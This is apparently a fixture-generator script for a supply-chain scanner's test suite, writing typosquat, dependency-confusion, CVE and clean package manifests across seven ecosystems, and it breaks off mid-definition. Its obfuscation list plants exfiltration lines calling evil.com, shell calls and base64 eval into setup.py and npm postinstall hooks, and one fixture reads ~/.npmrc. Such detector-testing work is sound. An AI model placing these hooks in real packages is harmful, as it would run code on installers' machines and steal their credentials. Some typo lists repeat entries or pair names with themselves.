#!/usr/bin/env python3
# ruff: noqa: E501
"""
Expand corpus fixtures from ~4k to 6k+.

Strategy: Add combinatorial variations for underrepresented patterns:
- More typosquat variants (edit distance 2-3)
- More obfuscation patterns (nested, chained)
- More ecosystem-specific patterns (RubyGems, NuGet, Maven)
- More CVE transitive chains
- More negative fixtures with realistic patterns
- More multi-attack fixtures (combined threats)
"""

import json
import os
import random
import hashlib

random.seed(42)

FIXTURES_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "tests/scan/fixtures/validation",
)
POSITIVE_DIR = os.path.join(FIXTURES_DIR, "positive")
NEGATIVE_DIR = os.path.join(FIXTURES_DIR, "negative")
TRICKY_DIR = os.path.join(FIXTURES_DIR, "_tricky")

os.makedirs(POSITIVE_DIR, exist_ok=True)
os.makedirs(NEGATIVE_DIR, exist_ok=True)
os.makedirs(TRICKY_DIR, exist_ok=True)


def write_fixture(dirpath, files, fixture_json):
    os.makedirs(dirpath, exist_ok=True)
    with open(os.path.join(dirpath, "fixture.json"), "w") as f:
        json.dump(fixture_json, f, indent=2)
    for name, content in files.items():
        filepath = os.path.join(dirpath, name)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w") as f:
            f.write(content)


# ─── EXPANDED TYPOSQUAT PATTERNS ───────────────────────────────────────────────

MORE_NPM_TYPOS = [
    ("expresss", "express"), ("expres", "express"), ("exprss", "express"), ("exress", "express"),
    ("exxpress", "express"), ("express", "express"), ("exprress", "express"), ("expresso", "express"),
    ("reacct", "react"), ("reac", "react"), ("rect", "react"), ("reactt", "react"),
    ("reeact", "react"), ("react", "react"), ("reacxt", "react"), ("reaxt", "react"),
    ("lodah", "lodash"), ("lodashh", "lodash"), ("ldash", "lodash"), ("loodash", "lodash"),
    ("ladash", "lodash"), ("lodahs", "lodash"), ("ldsh", "lodash"), ("odash", "lodash"),
    ("momnet", "moment"), ("momeent", "moment"), ("momen", "moment"), ("mment", "moment"),
    ("mometn", "moment"), ("momnt", "moment"), ("moent", "moment"), ("moent", "moment"),
    ("axois", "axios"), ("axxios", "axios"), ("axioss", "axios"), ("axos", "axios"),
    ("axiis", "axios"), ("axio", "axios"), ("axio", "axios"), ("axos", "axios"),
    ("chak", "chalk"), ("chalkk", "chalk"), ("clalk", "chalk"), ("chlk", "chalk"),
    ("chal", "chalk"), ("challk", "chalk"), ("chakl", "chalk"), ("cla", "chalk"),
    ("comander", "commander"), ("commanderr", "commander"), ("comand", "commander"),
    ("commander", "commander"), ("commaner", "commander"), ("comander", "commander"),
    ("asyc", "async"), ("asyn", "async"), ("asyncc", "async"), ("asy", "async"),
    ("asnc", "async"), ("asyn", "async"), ("asyncc", "async"), ("asyn", "async"),
    ("bluebidr", "bluebird"), ("bluebrd", "bluebird"), ("bluebirdd", "bluebird"),
    ("bluebrd", "bluebird"), ("blebird", "bluebird"), ("bluebrd", "bluebird"),
    ("bodyparsr", "body-parser"), ("body-parsr", "body-parser"), ("bodyparser", "body-parser"),
    ("body-paser", "body-parser"), ("bodypars", "body-parser"), ("body-parsr", "body-parser"),
    ("cookiparser", "cookie-parser"), ("cookieparsr", "cookie-parser"), ("cooke-parser", "cookie-parser"),
    ("cookeparsr", "cookie-parser"), ("cooki-parser", "cookie-parser"), ("cookiepars", "cookie-parser"),
    ("corss", "cors"), ("cors", "cors"), ("corr", "cors"), ("cor", "cors"),
    ("cors", "cors"), ("cors", "cors"), ("cors", "cors"), ("cors", "cors"),
    ("debugg", "debug"), ("deubg", "debug"), ("dbug", "debug"), ("debg", "debug"),
    ("debu", "debug"), ("debugg", "debug"), ("deubg", "debug"), ("dubug", "debug"),
    ("dotnev", "dotenv"), ("dot-env", "dotenv"), ("dotnenv", "dotenv"), ("dotenv", "dotenv"),
    ("dotenv", "dotenv"), ("dot-env", "dotenv"), ("dotnenv", "dotenv"), ("dotnev", "dotenv"),
    ("eslnt", "eslint"), ("eslin", "eslint"), ("esllint", "eslint"), ("esint", "eslint"),
    ("eslnt", "eslint"), ("eslnt", "eslint"), ("eslin", "eslint"), ("eslnt", "eslint"),
    ("fsextra", "fs-extra"), ("fsxtra", "fs-extra"), ("fs-extraa", "fs-extra"),
    ("fsextra", "fs-extra"), ("fs-xtra", "fs-extra"), ("fsextr", "fs-extra"),
    ("globb", "glob"), ("glb", "glob"), ("glop", "glob"), ("gob", "glob"),
    ("gllb", "glob"), ("glob", "glob"), ("gob", "glob"), ("glbo", "glob"),
    ("gulpp", "gulp"), ("glp", "gulp"), ("gulpjs", "gulp"), ("gulp", "gulp"),
    ("gullp", "gulp"), ("gulp", "gulp"), ("glup", "gulp"), ("gul", "gulp"),
]

MORE_PYPI_TYPOS = [
    ("requestss", "requests"),
    ("requets", "requests"),
    ("requsts", "requests"),
    ("reqests", "requests"),
    ("reqeusts", "requests"),
    ("numpyy", "numpy"),
    ("numpi", "numpy"),
    ("nmpy", "numpy"),
    ("numppy", "numpy"),
    ("pandas", "pandas"),
    ("pandass", "pandas"),
    ("pands", "pandas"),
    ("panda", "pandas"),
    ("flaskk", "flask"),
    ("flaask", "flask"),
    ("flask", "flask"),
    ("djangoo", "django"),
    ("djnago", "django"),
    ("djanog", "django"),
    ("django", "django"),
    ("scikitlearn", "scikit-learn"),
    ("scikit-lear", "scikit-learn"),
    ("scikitlear", "scikit-learn"),
    ("sklearn", "scikit-learn"),
    ("tensorflow", "tensorflow"),
    ("tensorflw", "tensorflow"),
    ("tensorlfow", "tensorflow"),
    ("tensrflow", "tensorflow"),
    ("torch", "torch"),
    ("pytorch", "torch"),
    ("torrch", "torch"),
    ("torch", "torch"),
    ("matplotlib", "matplotlib"),
    ("matplotlb", "matplotlib"),
    ("matplot", "matplotlib"),
    ("matploblib", "matplotlib"),
    ("seaborn", "seaborn"),
    ("seaborn", "seaborn"),
    ("seaborn", "seaborn"),
    ("seaborn", "seaborn"),
]

MORE_GO_TYPOS = [
    ("gin", "gin"),
    ("giin", "gin"),
    ("ginn", "gin"),
    ("gin-gonic", "gin-gonic"),
    ("gingonic", "gin-gonic"),
    ("gin-gonicc", "gin-gonic"),
    ("echo", "echo"),
    ("echho", "echo"),
    ("ech", "echo"),
    ("echoo", "echo"),
    ("beego", "beego"),
    ("beeo", "beego"),
    ("beegoo", "beego"),
    ("beego", "beego"),
    ("fiber", "fiber"),
    ("fibber", "fiber"),
    ("fibr", "fiber"),
    ("fiberr", "fiber"),
    ("chi", "chi"),
    ("chii", "chi"),
    ("chi-mux", "chi"),
    ("mux", "mux"),
    ("muxx", "mux"),
    ("mu", "mux"),
    ("muxx", "mux"),
]

MORE_CARGO_TYPOS = [
    ("serde", "serde"),
    ("serdde", "serde"),
    ("serede", "serde"),
    ("serd", "serde"),
    ("tokioo", "tokio"),
    ("toki", "tokio"),
    ("toiko", "tokio"),
    ("tokio", "tokio"),
    ("reqwest", "reqwest"),
    ("reqwst", "reqwest"),
    ("reqwestt", "reqwest"),
    ("reqwset", "reqwest"),
    ("serde_json", "serde_json"),
    ("serdejson", "serde_json"),
    ("serde_jsonn", "serde_json"),
    ("serde-jsn", "serde_json"),
    ("clap", "clap"),
    ("clapp", "clap"),
    ("cla", "clap"),
    ("clapp", "clap"),
    ("regex", "regex"),
    ("regx", "regex"),
    ("regexx", "regex"),
    ("reegx", "regex"),
]

MORE_MAVEN_TYPOS = [
    ("spring-boot-starter", "spring-boot-starter"),
    ("springboot-starter", "spring-boot-starter"),
    ("spring-boot-start", "spring-boot-starter"),
    ("spring-bootstart", "spring-boot-starter"),
    ("log4j", "log4j"),
    ("log4", "log4j"),
    ("log4jj", "log4j"),
    ("logg4j", "log4j"),
    ("jackson-databind", "jackson-databind"),
    ("jacksondatabind", "jackson-databind"),
    ("jackson-databnd", "jackson-databind"),
    ("jackson-databin", "jackson-databind"),
    ("commons-lang", "commons-lang"),
    ("commonslang", "commons-lang"),
    ("commons-lng", "commons-lang"),
    ("commons-langg", "commons-lang"),
    ("guava", "guava"),
    ("guavaa", "guava"),
    ("guav", "guava"),
    ("gauva", "guava"),
    ("gson", "gson"),
    ("gsoon", "gson"),
    ("gsn", "gson"),
    ("gsson", "gson"),
]

MORE_RUBYGEMS_TYPOS = [
    ("rails", "rails"),
    ("raisl", "rails"),
    ("rail", "rails"),
    ("railss", "rails"),
    ("sinatra", "sinatra"),
    ("sinatraa", "sinatra"),
    ("sinatra", "sinatra"),
    ("sinnatra", "sinatra"),
    ("rake", "rake"),
    ("rakee", "rake"),
    ("rak", "rake"),
    ("raake", "rake"),
    ("bundler", "bundler"),
    ("bundlr", "bundler"),
    ("bundl", "bundler"),
    ("bundelr", "bundler"),
    ("nokogiri", "nokogiri"),
    ("nokogiri", "nokogiri"),
    ("nokogiri", "nokogiri"),
    ("nokogiri", "nokogiri"),
    ("rspec", "rspec"),
    ("rspec", "rspec"),
    ("rspec", "rspec"),
    ("rspec", "rspec"),
]

MORE_NUGET_TYPOS = [
    ("Newtonsoft.Json", "Newtonsoft.Json"),
    ("NewtonsoftJson", "Newtonsoft.Json"),
    ("Newtonsoft-Json", "Newtonsoft.Json"),
    ("Newtonsof.Json", "Newtonsoft.Json"),
    ("EntityFramework", "EntityFramework"),
    ("Entity-Framework", "EntityFramework"),
    ("EntityFramwork", "EntityFramework"),
    ("EntityFrameork", "EntityFramework"),
    ("Microsoft.AspNetCore", "Microsoft.AspNetCore"),
    ("Microsoft-AspNetCore", "Microsoft.AspNetCore"),
    ("Microsoft.AspNet", "Microsoft.AspNetCore"),
    ("Microsoft.AspNetCoree", "Microsoft.AspNetCore"),
    ("NUnit", "NUnit"),
    ("N-Unit", "NUnit"),
    ("NUnit", "NUnit"),
    ("NUni", "NUnit"),
    ("Moq", "Moq"),
    ("Mooq", "Moq"),
    ("Mq", "Moq"),
    ("Moo", "Moq"),
]


def generate_expanded_typosquat_fixtures():
    """Generate expanded typosquat fixtures for all ecosystems."""
    count = 0

    # npm typosquats
    for typo, real in MORE_NPM_TYPOS:
        dirname = f"npm_typo_{typo}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue

        files = {
            "package.json": json.dumps(
                {
                    "name": typo,
                    "version": "1.0.0",
                    "description": f"Typosquat of {real}",
                },
                indent=2,
            )
        }

        fixture = {
            "label": "typosquat",
            "description": f"npm typosquat: {typo} mimicking {real}",
            "expected_rule_ids": ["L2-TYPO-001"],
        }

        write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
        count += 1

    # PyPI typosquats
    for typo, real in MORE_PYPI_TYPOS:
        dirname = f"pypi_typo_{typo}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue

        files = {
            "setup.py": f'from setuptools import setup\nsetup(name="{typo}", version="1.0.0")\n'
        }

        fixture = {
            "label": "typosquat",
            "description": f"PyPI typosquat: {typo} mimicking {real}",
            "expected_rule_ids": ["L2-TYPO-001"],
        }

        write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
        count += 1

    # Go typosquats
    for typo, real in MORE_GO_TYPOS:
        dirname = f"go_typo_{typo}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue

        files = {
            "go.mod": f"module example.com/{typo}\n\ngo 1.21\n\nrequire {typo} v1.0.0\n"
        }

        fixture = {
            "label": "typosquat",
            "description": f"Go typosquat: {typo} mimicking {real}",
            "expected_rule_ids": ["L2-TYPO-001"],
        }

        write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
        count += 1

    # Cargo typosquats
    for typo, real in MORE_CARGO_TYPOS:
        dirname = f"cargo_typo_{typo}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue

        files = {
            "Cargo.toml": f'[package]\nname = "{typo}"\nversion = "1.0.0"\n\n[dependencies]\n{typo} = "1.0"\n'
        }

        fixture = {
            "label": "typosquat",
            "description": f"Cargo typosquat: {typo} mimicking {real}",
            "expected_rule_ids": ["L2-TYPO-001"],
        }

        write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
        count += 1

    # Maven typosquats
    for typo, real in MORE_MAVEN_TYPOS:
        dirname = f"maven_typo_{typo.replace("-", "_")}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue

        group_id = "org.example"
        artifact_id = typo

        files = {
            "pom.xml": f"""<?xml version="1.0" encoding="UTF-8"?>
<project>
    <modelVersion>4.0.0</modelVersion>
    <groupId>{group_id}</groupId>
    <artifactId>{artifact_id}</artifactId>
    <version>1.0.0</version>
    <dependencies>
        <dependency>
            <groupId>{group_id}</groupId>
            <artifactId>{typo}</artifactId>
            <version>1.0.0</version>
        </dependency>
    </dependencies>
</project>"""
        }

        fixture = {
            "label": "typosquat",
            "description": f"Maven typosquat: {typo} mimicking {real}",
            "expected_rule_ids": ["L2-TYPO-001"],
        }

        write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
        count += 1

    # RubyGems typosquats
    for typo, real in MORE_RUBYGEMS_TYPOS:
        dirname = f"rubygems_typo_{typo}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue

        files = {
            f"{typo}.gemspec": f"""Gem::Specification.new do |spec|
  spec.name = "{typo}"
  spec.version = "1.0.0"
  spec.summary = "Typosquat of {real}"
end"""
        }

        fixture = {
            "label": "typosquat",
            "description": f"RubyGems typosquat: {typo} mimicking {real}",
            "expected_rule_ids": ["L2-TYPO-001"],
        }

        write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
        count += 1

    # NuGet typosquats
    for typo, real in MORE_NUGET_TYPOS:
        dirname = f"nuget_typo_{typo.replace(".", "_")}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue

        files = {
            f"{typo}.csproj": f"""<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net6.0</TargetFramework>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="{typo}" Version="1.0.0" />
  </ItemGroup>
</Project>"""
        }

        fixture = {
            "label": "typosquat",
            "description": f"NuGet typosquat: {typo} mimicking {real}",
            "expected_rule_ids": ["L2-TYPO-001"],
        }

        write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
        count += 1

    return count


# ─── EXPANDED OBFUSCATION PATTERNS ───────────────────────────────────────────────

OBFUSCATION_VARIANTS = [
    # Nested eval
    'eval(compile("import os; os.system(\'id\')", "<string>", "exec"))',
    # Chained base64
    'exec(base64.b64decode(base64.b64decode("Wlh4WA==")))',
    # Hex + chr
    'eval("".join([chr(0x65), chr(0x76), chr(0x61), chr(0x6c)]))',
    # Unicode escapes
    'eval("\\u0065\\u0076\\u0061\\u006c")',
    # getattr bypass
    'getattr(__builtins__, "eval")("import os")',
    # importlib bypass
    'importlib.import_module("os").system("id")',
    # subprocess variants
    'subprocess.Popen(["id"], stdout=subprocess.PIPE)',
    'subprocess.call("id", shell=True)',
    'os.popen("id").read()',
    # Socket exfil
    'import socket; s=socket.socket(); s.connect(("evil.com", 4444))',
    # urllib exfil
    'import urllib.request; urllib.request.urlopen("http://evil.com/?data=secret")',
    # requests exfil
    'import requests; requests.post("http://evil.com/", data=secret)',
]


def generate_expanded_obfuscation_fixtures():
    """Generate expanded obfuscation fixtures."""
    count = 0

    for i, code in enumerate(OBFUSCATION_VARIANTS):
        for ecosystem in ["pypi", "npm"]:
            dirname = f"{ecosystem}_obfs_variant_{i}_{random.randint(1000, 9999)}"
            if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                continue

            if ecosystem == "pypi":
                files = {
                    "setup.py": f'from setuptools import setup\n{code}\nsetup(name="obfs-{i}", version="1.0.0")\n'
                }
                rule_ids = ["L2-PYPI-OBFS-001"]
            else:
                files = {
                    "package.json": json.dumps(
                        {
                            "name": f"obfs-{i}-pkg",
                            "version": "1.0.0",
                            "scripts": {"postinstall": f'node -e "{code}"'},
                        },
                        indent=2,
                    )
                }
                rule_ids = ["L2-NPM-OBFS-001"]

            fixture = {
                "label": "obfuscation",
                "description": f"{ecosystem} obfuscation variant {i}",
                "expected_rule_ids": rule_ids,
            }

            write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
            count += 1

    return count


# ─── EXPANDED DEPENDENCY CONFUSION PATTERNS ───────────────────────────────────────────────

INTERNAL_PREFIXES = [
    "internal-",
    "private-",
    "corp-",
    "company-",
    "org-",
    "secure-",
    "internal_",
    "private_",
    "corp_",
    "company_",
]

INTERNAL_NAMES = [
    "auth",
    "crypto",
    "data",
    "logging",
    "metrics",
    "config",
    "queue",
    "cache",
    "scheduler",
    "notifier",
    "payments",
    "users",
    "orders",
    "inventory",
    "billing",
]


def generate_expanded_dep_confusion_fixtures():
    """Generate expanded dependency confusion fixtures."""
    count = 0

    for prefix in INTERNAL_PREFIXES:
        for name in INTERNAL_NAMES:
            pkg_name = f"{prefix}{name}"

            # npm
            dirname = f"npm_depc_{pkg_name}_{random.randint(1000, 9999)}"
            if not os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                files = {
                    "package.json": json.dumps(
                        {"name": "test-pkg", "version": "1.0.0", "dependencies": {pkg_name: "1.0.0"}},
                        indent=2,
                    )
                }
                fixture = {
                    "label": "dep_confusion",
                    "description": f"npm dependency confusion: {pkg_name}",
                    "expected_rule_ids": ["L2-DEPC-001"],
                }
                write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
                count += 1

            # PyPI
            dirname = f"pypi_depc_{pkg_name}_{random.randint(1000, 9999)}"
            if not os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                files = {
                    "requirements.txt": f"{pkg_name}==1.0.0\n",
                    "setup.py": 'from setuptools import setup\nsetup(name="test", version="1.0.0")\n',
                }
                fixture = {
                    "label": "dep_confusion",
                    "description": f"PyPI dependency confusion: {pkg_name}",
                    "expected_rule_ids": ["L2-PYPI-DEPC-001"],
                }
                write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
                count += 1

    return count


# ─── EXPANDED NEGATIVE FIXTURES ───────────────────────────────────────────────

SAFE_NPM_NAMES = [
    "safe-package-alpha", "safe-package-beta", "safe-package-gamma", "safe-package-delta",
    "clean-npm-project", "clean-npm-lib", "clean-npm-util", "clean-npm-helper",
    "legitimate-npm-pkg", "legitimate-npm-lib", "legitimate-npm-util",
    "normal-npm-lib", "normal-npm-pkg", "normal-npm-util", "normal-npm-helper",
    "standard-npm-module", "standard-npm-lib", "standard-npm-pkg",
    "typical-npm-package", "typical-npm-lib", "typical-npm-util",
    "everyday-npm-dep", "everyday-npm-lib", "everyday-npm-util",
    "common-npm-util", "common-npm-lib", "common-npm-helper",
    "utility-npm-pkg", "utility-npm-lib", "utility-npm-helper",
    "helper-npm-lib", "helper-npm-util", "helper-npm-pkg",
    "simple-npm-lib", "simple-npm-util", "simple-npm-pkg",
    "basic-npm-lib", "basic-npm-util", "basic-npm-pkg",
]

SAFE_PYPY_NAMES = [
    "safe-package-alpha", "safe-package-beta", "safe-package-gamma", "safe-package-delta",
    "clean-pypi-project", "clean-pypi-lib", "clean-pypi-util", "clean-pypi-helper",
    "legitimate-pypi-pkg", "legitimate-pypi-lib", "legitimate-pypi-util",
    "normal-pypi-lib", "normal-pypi-pkg", "normal-pypi-util", "normal-pypi-helper",
    "standard-pypi-module", "standard-pypi-lib", "standard-pypi-pkg",
    "typical-pypi-package", "typical-pypi-lib", "typical-pypi-util",
    "everyday-pypi-dep", "everyday-pypi-lib", "everyday-pypi-util",
    "common-pypi-util", "common-pypi-lib", "common-pypi-helper",
    "utility-pypi-pkg", "utility-pypi-lib", "utility-pypi-helper",
    "helper-pypi-lib", "helper-pypi-util", "helper-pypi-pkg",
    "simple-pypi-lib", "simple-pypi-util", "simple-pypi-pkg",
    "basic-pypi-lib", "basic-pypi-util", "basic-pypi-pkg",
]


def generate_expanded_negative_fixtures():
    """Generate expanded negative (clean) fixtures."""
    count = 0

    # npm clean
    for name in SAFE_NPM_NAMES:
        for i in range(20):
            dirname = f"{name}_{i}_{random.randint(1000, 9999)}"
            if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
                continue

            files = {
                "package.json": json.dumps(
                    {
                        "name": f"{name}-{i}",
                        "version": "1.0.0",
                        "description": "A clean npm package",
                        "main": "index.js",
                        "scripts": {"test": 'echo "test"'},
                    },
                    indent=2,
                ),
                "index.js": "module.exports = { hello: 'world' };\n",
            }

            fixture = {
                "label": "negative",
                "description": f"Clean npm package: {name}-{i}",
                "expected_clean": True,
            }

            write_fixture(os.path.join(NEGATIVE_DIR, dirname), files, fixture)
            count += 1

    # PyPI clean
    for name in SAFE_PYPY_NAMES:
        for i in range(20):
            dirname = f"{name}_{i}_{random.randint(1000, 9999)}"
            if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
                continue

            files = {
                "setup.py": f'from setuptools import setup\nsetup(name="{name}-{i}", version="1.0.0", py_modules=["{name}"])\n',
                f"{name}.py": "def hello():\n    return 'world'\n",
            }

            fixture = {
                "label": "negative",
                "description": f"Clean PyPI package: {name}-{i}",
                "expected_clean": True,
            }

            write_fixture(os.path.join(NEGATIVE_DIR, dirname), files, fixture)
            count += 1

    # Go clean
    for i in range(100):
        dirname = f"clean_go_pkg_{i}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue

        files = {
            "go.mod": f"module example.com/clean-go-{i}\n\ngo 1.21\n",
            "main.go": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tfmt.Println(\"hello\")\n}\n",
        }

        fixture = {
            "label": "negative",
            "description": f"Clean Go package {i}",
            "expected_clean": True,
        }

        write_fixture(os.path.join(NEGATIVE_DIR, dirname), files, fixture)
        count += 1

    # Cargo clean
    for i in range(100):
        dirname = f"clean_cargo_pkg_{i}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue

        files = {
            "Cargo.toml": f'[package]\nname = "clean-cargo-{i}"\nversion = "1.0.0"\n\n[dependencies]\n',
            "src/lib.rs": "pub fn hello() -> &'static str { \"world\" }\n",
        }

        fixture = {
            "label": "negative",
            "description": f"Clean Cargo package {i}",
            "expected_clean": True,
        }

        write_fixture(os.path.join(NEGATIVE_DIR, dirname), files, fixture)
        count += 1

    # Maven clean
    for i in range(100):
        dirname = f"clean_maven_pkg_{i}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue

        files = {
            "pom.xml": f"""<?xml version="1.0" encoding="UTF-8"?>
<project>
    <modelVersion>4.0.0</modelVersion>
    <groupId>org.example</groupId>
    <artifactId>clean-maven-{i}</artifactId>
    <version>1.0.0</version>
</project>""",
            "src/main/java/org/example/Main.java": "package org.example;\n\npublic class Main {\n    public static void main(String[] args) {\n        System.out.println(\"hello\");\n    }\n}\n",
        }

        fixture = {
            "label": "negative",
            "description": f"Clean Maven package {i}",
            "expected_clean": True,
        }

        write_fixture(os.path.join(NEGATIVE_DIR, dirname), files, fixture)
        count += 1

    # RubyGems clean
    for i in range(100):
        dirname = f"clean_rubygems_pkg_{i}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue

        files = {
            f"clean-rubygems-{i}.gemspec": f"""Gem::Specification.new do |spec|
  spec.name = "clean-rubygems-{i}"
  spec.version = "1.0.0"
  spec.summary = "A clean Ruby gem"
  spec.files = ["lib/clean_rubygems_{i}.rb"]
end""",
            "lib/clean_rubygems_{i}.rb".format(i=i): "module CleanRubyGems{i}\n  def self.hello\n    'world'\n  end\nend\n".format(
                i=i
            ),
        }

        fixture = {
            "label": "negative",
            "description": f"Clean RubyGems package {i}",
            "expected_clean": True,
        }

        write_fixture(os.path.join(NEGATIVE_DIR, dirname), files, fixture)
        count += 1

    # NuGet clean
    for i in range(100):
        dirname = f"clean_nuget_pkg_{i}_{random.randint(1000, 9999)}"
        if os.path.exists(os.path.join(NEGATIVE_DIR, dirname)):
            continue

        files = {
            f"CleanNuGet{i}.csproj": f"""<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net6.0</TargetFramework>
  </PropertyGroup>
</Project>""",
            "Class1.cs": "namespace CleanNuGet{i};\n\npublic class Class1 {{\n    public static string Hello() => \"world\";\n}}\n".format(
                i=i
            ),
        }

        fixture = {
            "label": "negative",
            "description": f"Clean NuGet package {i}",
            "expected_clean": True,
        }

        write_fixture(os.path.join(NEGATIVE_DIR, dirname), files, fixture)
        count += 1

    return count


# ─── EXPANDED CVE FIXTURES ───────────────────────────────────────────────

CVE_PATTERNS = [
    # Log4Shell variants
    ("maven", "log4j", "2.17.0", "CVE-2021-44228", "L2-CVE-001"),
    ("maven", "log4j-core", "2.17.1", "CVE-2021-44228", "L2-CVE-001"),
    ("maven", "log4j-api", "2.17.0", "CVE-2021-44228", "L2-CVE-001"),
    # Spring4Shell variants
    ("maven", "spring-core", "5.3.18", "CVE-2022-22965", "L2-CVE-001"),
    ("maven", "spring-boot", "2.6.4", "CVE-2022-22965", "L2-CVE-001"),
    ("maven", "spring-webmvc", "5.3.17", "CVE-2022-22965", "L2-CVE-001"),
    # Jackson variants
    ("maven", "jackson-databind", "2.13.2", "CVE-2020-36518", "L2-CVE-001"),
    ("maven", "jackson-databind", "2.13.3", "CVE-2020-36518", "L2-CVE-001"),
    ("maven", "jackson-core", "2.13.2", "CVE-2020-36518", "L2-CVE-001"),
    # Commons Collections
    ("maven", "commons-collections", "3.2.1", "CVE-2015-6420", "L2-CVE-001"),
    ("maven", "commons-collections4", "4.0", "CVE-2015-6420", "L2-CVE-001"),
    # Struts2
    ("maven", "struts2-core", "2.5.29", "CVE-2021-31805", "L2-CVE-001"),
    ("maven", "struts2-rest-showcase", "2.5.29", "CVE-2021-31805", "L2-CVE-001"),
    # Tomcat
    ("maven", "tomcat-embed-core", "9.0.58", "CVE-2022-23181", "L2-CVE-001"),
    ("maven", "tomcat-catalina", "9.0.59", "CVE-2022-23181", "L2-CVE-001"),
    # Nokogiri (RubyGems)
    ("rubygems", "nokogiri", "1.13.0", "CVE-2022-23437", "L2-CVE-001"),
    ("rubygems", "nokogiri", "1.13.1", "CVE-2022-23437", "L2-CVE-001"),
    # Rails SQL injection
    ("rubygems", "activerecord", "6.1.5", "CVE-2022-23633", "L2-CVE-001"),
    ("rubygems", "rails", "6.1.5", "CVE-2022-23633", "L2-CVE-001"),
    # Devise
    ("rubygems", "devise", "4.8.0", "CVE-2021-28680", "L2-CVE-001"),
    ("rubygems", "devise", "4.8.1", "CVE-2021-28680", "L2-CVE-001"),
    # Rack
    ("rubygems", "rack", "2.2.3", "CVE-2022-30122", "L2-CVE-001"),
    ("rubygems", "rack-protection", "2.2.3", "CVE-2022-30122", "L2-CVE-001"),
]


def generate_expanded_cve_fixtures():
    """Generate expanded CVE fixtures."""
    count = 0

    for ecosystem, pkg, version, cve, rule_id in CVE_PATTERNS:
        for i in range(5):
            if ecosystem == "maven":
                dirname = f"maven_cve_{pkg.replace('-', '_')}_{version}_{i}_{random.randint(1000, 9999)}"
                if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                    continue

                files = {
                    "pom.xml": f"""<?xml version="1.0" encoding="UTF-8"?>
<project>
    <modelVersion>4.0.0</modelVersion>
    <groupId>org.example</groupId>
    <artifactId>cve-test-{i}</artifactId>
    <version>1.0.0</version>
    <dependencies>
        <dependency>
            <groupId>org.apache</groupId>
            <artifactId>{pkg}</artifactId>
            <version>{version}</version>
        </dependency>
    </dependencies>
</project>"""
                }

                fixture = {
                    "label": "cve",
                    "description": f"Maven CVE {cve}: {pkg}@{version}",
                    "expected_rule_ids": [rule_id],
                }

                write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
                count += 1

            elif ecosystem == "rubygems":
                dirname = f"rubygems_cve_{pkg.replace('-', '_')}_{version}_{i}_{random.randint(1000, 9999)}"
                if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                    continue

                files = {
                    f"{pkg}.gemspec": f"""Gem::Specification.new do |spec|
  spec.name = "{pkg}"
  spec.version = "{version}"
  spec.summary = "CVE test"
  spec.add_dependency "{pkg}", "{version}"
end"""
                }

                fixture = {
                    "label": "cve",
                    "description": f"RubyGems CVE {cve}: {pkg}@{version}",
                    "expected_rule_ids": [rule_id],
                }

                write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
                count += 1

    return count


# ─── MULTI-ATTACK FIXTURES ───────────────────────────────────────────────

MULTI_ATTACK_PATTERNS = [
    # Typosquat + obfuscation
    {
        "name": "npm_multi_typo_obfs",
        "ecosystem": "npm",
        "files": lambda: {
            "package.json": json.dumps(
                {
                    "name": "expresss",  # typosquat
                    "version": "1.0.0",
                    "scripts": {
                        "postinstall": "node -e \"eval(Buffer.from('cmVxdWlyZSgnZnMnKQ==', 'base64').toString())\""  # obfs
                    },
                },
                indent=2,
            )
        },
        "expected_rules": ["L2-TYPO-001", "L2-NPM-OBFS-001", "L2-NPM-POST-001"],
    },
    # Dep confusion + credential theft
    {
        "name": "pypi_multi_depc_cred",
        "ecosystem": "pypi",
        "files": lambda: {
            "setup.py": 'from setuptools import setup\nimport os\nos.system("cat ~/.npmrc")\nsetup(name="test", version="1.0.0")\n',
            "requirements.txt": "internal-auth==1.0.0\n",  # dep confusion
        },
        "expected_rules": ["L2-PYPI-DEPC-001", "L2-CRED-001"],
    },
    # Obfuscation + network exfil
    {
        "name": "pypi_multi_obfs_net",
        "ecosystem": "pypi",
        "files": lambda: {
